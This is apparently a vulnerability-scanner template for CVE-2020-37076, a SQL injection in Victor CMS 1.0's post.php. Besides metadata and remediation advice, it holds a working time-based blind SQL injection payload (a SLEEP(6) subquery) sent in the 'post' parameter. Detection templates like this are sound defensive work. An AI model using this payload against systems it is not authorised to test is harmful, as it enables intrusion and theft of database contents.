id: CVE-2020-37076

info:
  name: Victor CMS 1.0 - SQL Injection in post.php
  author: bswearingen
  severity: high
  description: |
    Victor CMS version 1.0 contains a SQL injection vulnerability in the 'post' parameter on post.php that allows remote attackers to manipulate database queries. Attackers can exploit this vulnerability by sending crafted UNION SELECT payloads to extract database information through boolean based, error based, and time based injection techniques.
  impact: |
    Remote attackers can extract sensitive data from the database including credentials and user information.
  remediation: |
    Apply input validation and parameterized queries to the post parameter in post.php.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-37076
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 8.2
    cve-id: CVE-2020-37076
    cwe-id: CWE-89
  metadata:
    verified: true
    vendor: developer-developer
    product: victor-cms
  tags: cve,cve2020,victorcms,sqli,unauth

http:
  - raw:
      - |
        GET /post.php?post=1%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))a)--%20- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'

      - type: status
        status:
          - 200
          - 500
        condition: or
